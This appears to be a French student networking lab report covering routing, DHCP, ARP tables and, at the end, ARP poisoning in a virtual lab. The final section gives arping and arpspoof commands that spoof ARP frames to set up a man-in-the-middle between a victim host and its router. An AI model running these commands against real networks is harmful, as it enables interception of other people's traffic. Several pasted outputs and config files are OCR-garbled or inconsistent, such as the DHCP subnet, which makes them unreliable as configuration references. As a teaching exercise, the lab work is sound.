# TP2 : Routage, DHCP et DNS

# I Routage

**Configuration de `router.tp2.efrei`**
````
[root@localhost rocky]# ping google.com
PING google.com (142.250.74.238) 56(84) bytes of data.
64 bytes from par10s40-in-f14.1e100.net (142.250.74.238): icmp_seq=1 ttl=57 time=36.1 ms
64 bytes from par10s40-in-f14.1e100.net (142.250.74.238): icmp_seq=2 ttl=57 time=95.9 ms
64 bytes from par10s40-in-f14.1e100.net (142.250.74.238): icmp_seq=4 ttl=57 time=45.7 ms
64 bytes from par10s40-in-f14.1e100.net (142.250.74.238): icmp_seq=3 ttl=57 time=49.3 ms 
64 bytes from par10s40-in-f14.1100. net (142.250.74.238): icmp_seq=5 ttl=57 time=48.1 ms
````

**La config :** 
````
[root@localhost network-scripts]# ip a
1: 10: «LOOPBACK,UP, LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
link/loopback 00:00:00:00:00:00 brđ 00:00:00:00:00:00
inet 127.0.0.1/8 scope host lo
valid ift forever preferred_ift forever
inet6 ::1/128 scope host
valid Ift forever preferred_Ift forever
2: enp0s3: «BROADCAST, MULTICAST, UP, LOWER UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
link/ether 08:08:27:64:56:42 brd ff:ff:ff:ff:ff:ff
inet 10.2.1.254/24 brd 10.2.1.255 scope global nopref ixroute enpass
valid Ift forever preferred_Ift forever
inet6 feBB: :aBB:27ff:fe64:5642/64 scope link
valid_ift forever preferred_Ift forever
3: enp0s8: <BRDADCAST, MULTICAST, UP ,LOVER UP> mtu 1500 qdisc fq_codel state UP group default glen 1000
link/ether 08:00:27:f0:81:ff brd ff:ff:ff:ff:ff:ff
inet 192.168.122.113/24 brd 192.168.122.255 scope global dynamic nopref ixroute enpis®
valid_Ift 3515sec preferred_Ift 3515sec
inet6 feß0: :a00:27ff:fef0:81ff/64 scope link
valid_ift forever preferred_Ift forever
````

**Modif firewall pour `router.tp2.efrei`**
````
[root@localhost rocky]# firewall-cmd --add-masquerade
success
````
````
[root@localhost rocky ~]# sudo firewall-cmd --add-masquerade --permanent
success
````

**Configuration de `node1.tp2.efrei`**
````

PC1> show ip

NAME        : PC1[1]
IP/MASK     : 10.2.1.1/24
GATEWAY     : 10.2.1.254
DNS         :
MAC         : 00:50:79:66:68:00
LPORT       : 20004
RHOST:PORT  : 127.0.0.1:20005
MTU         : 1500
````

### Ping `node1.tp2.efrei`
````

PC1> ping 1.1.1.1

84 bytes from 1.1.1.1 icmp_seq=1 ttl=56 time=72.409 ms
84 bytes from 1.1.1.1 icmp_seq=2 ttl=56 time=46.155 ms
84 bytes from 1.1.1.1 icmp_seq=3 ttl=56 time=37.141 ms
84 bytes from 1.1.1.1 icmp_seq=4 ttl=56 time=80.252 ms
84 bytes from 1.1.1.1 icmp_seq=5 ttl=56 time=50.914 ms
````

### Ping `node1.tp2.efrei` vers `router.tp2.efrei`
````

PC1> ping 10.2.1.254

84 bytes from 10.2.1.254 icmp_seq=1 ttl=64 time=8.776 ms
84 bytes from 10.2.1.254 icmp_seq=2 ttl=64 time=5.624 ms
84 bytes from 10.2.1.254 icmp_seq=3 ttl=64 time=7.423 ms
84 bytes from 10.2.1.254 icmp_seq=4 ttl=64 time=5.113 ms
84 bytes from 10.2.1.254 icmp_seq=5 ttl=64 time=4.566 ms
````

**Afficher la CAM table du switch**

````
IOU1#show mac address-table
          Mac Address Table
-------------------------------------------

Vlan    Mac Address       Type        Ports
----    -----------       --------    -----
   1    0050.7966.6800    DYNAMIC     Et2/2
   1    0800.2764.5642    DYNAMIC     Et1/3
Total Mac Addresses for this criterion: 2
````

# II Serveur DHCP

**Install et conf du serveur DHCP `dhcp.tp2.efrei`**
````
[root@localhost ~]# cat /etc/dhcp/dhcpd.conf
subnet 10.1.1.0 netmask 255.255.255.0 {
    range 10.2.1.10 10.2.1.50;
    option broadcast-address 10.2.1.1;
    option routers 10.2.1.254;
    option subnet-mask 255.255.255.0;
    option domain-name-servers 1.1.1.1;
}
````


`IP Static`

````
[rocky@localhost ~]$ cat /etc/sysconf ig/network-scripts/ifcfg-enp0s3
DEUICE=enp0s3
NAME=1an
ONBOOT-yes
BOOTPROTO=static
IPADDR=10.2.1.253
NETMASK=255.255.255.0
GATELAY=10.2.1.254
````

`Vérif internet(Bo ping)`
````
[rocky@localhost ~]$ ping google.com
PING google.com (172.217.20.174) 56(84) bytes of data.
64 bytes from par10s49-in-f14.1e100.net (172.217.20.174): icmp_seq=1 ttl=56 time=69.8 ms
64 bytes from par10s49-in-f14.1e100.net (172.217.20.174): icmp_seq=2 ttl=56 time=31.7 ms
64 bytes from par10s49-in-f14.1e100.net (172.217.20.174): icmp_seq=3 ttl=56 time=49.5 ms
64 bytes from par 10s49-in-f14.1100.net (172.217.20.174): icmp_seq=4 ttl-56 time=45.9 ms
64 bytes from par10s49-in-f14.1e100.net (172.217.20.174): icmp_seq=5 ttl=56 time=47.9 ms
````

**Test du DHCP** sur `node1.tp2.efrei`
````

PC1> dhcp
DDORA IP 10.2.1.10/24 GW 10.2.1.254

PC1> show ip

NAME        : PC1[1]
IP/MASK     : 10.2.1.10/24
GATEWAY     : 10.2.1.254
DNS         : 1.1.1.1
DHCP SERVER : 10.2.1.253
DHCP LEASE  : 42837, 43200/21600/37800
MAC         : 00:50:79:66:68:00
LPORT       : 20005
RHOST:PORT  : 127.0.0.1:20006
MTU         : 1500
````

### Ping de vérification internet de `node1.tp2.efrei`
````
PC1> ping google.com
google.com resolved to 142.250.179.110

84 bytes from 142.250.179.110 icmp_seq=1 ttl=56 time=34.475 ms
84 bytes from 142.250.179.110 icmp_seq=2 ttl=56 time=58.316 ms
84 bytes from 142.250.179.110 icmp_seq=3 ttl=56 time=54.499 ms
84 bytes from 142.250.179.110 icmp_seq=4 ttl=56 time=37.765 ms
````

**BONUS**

````
[root@localhost ~]# cat /etc/dhcp/dhcpd.conf
subnet 10.1.1.0 netmask 255.255.255.0 {
    range 10.2.1.10 10.2.1.50;
    option broadcast-address 10.2.1.1;
    option routers 10.2.1.254;
    option subnet-mask 255.255.255.0;
    option domain-name-servers 1.1.1.1;
}
````
````
PC1> show ip

NAME        : PC1[1]
IP/MASK     : 10.2.1.10/24
GATEWAY     : 10.2.1.254
DNS         : 1.1.1.1
DHCP SERVER : 10.2.1.253
DHCP LEASE  : 38755, 43200/21600/37800
MAC         : 00:50:79:66:68:00
LPORT       : 20005
RHOST:PORT  : 127.0.0.1:20006
MTU         : 1500
````

**[Echange DHCP DORA](DHCP.pcapng)**

# III ARP

### Etape I les tables ARP

**Table ARP `router.tp2.efrei`**
````
[rockyPlocalhost ~]$ ip neigh show
10.2.1.10 dev enp0s3 1laddr 00:50:79:66:68:00 STALE
10.2.1.1 dev enp0s3 1laddr 00:50:79:66:68:00 STALE
10.2.1.253 dev enp0s3 lladdr 08:00:27:cZ:66:dd STALE
192.168.122.1 dev enp0s8 1laddr 52:54:00:23:04:c2 REACHABLE
````

**[Echange ARP `node1.tp2.efrei`](./ARP.pcapng)**

### Etape II ARP poisoning

## 2. ARP poisoning

**Envoyer une trame ARP arbitraire**
````
(root kali) -[/home/kali]
arping -c 1 -U -s 01:02:03:04:05:06 -S 1.2.3.4 10.2.1.10
ARPING 10.2.1.10
Timeout
10.2.1.10 statistics
1 packets transmitted, O packets received, 100% unanswered (0 extra)
````
**[Tram wireshark ARPING](ARPING.pcapng)**


**Mettre en place un ARP MITN**
````
sudo arpspoof -i eth0 -t 10.2.1.10(v) 10.2.1.254(r)
sudo arpspoof -i eth0 -t 10.2.1.254(r) 10.2.1.10(v)
````

**[Tram wireshark ARPSPOOF](MITNARP.pcapng)**

**[Script python](script.py)**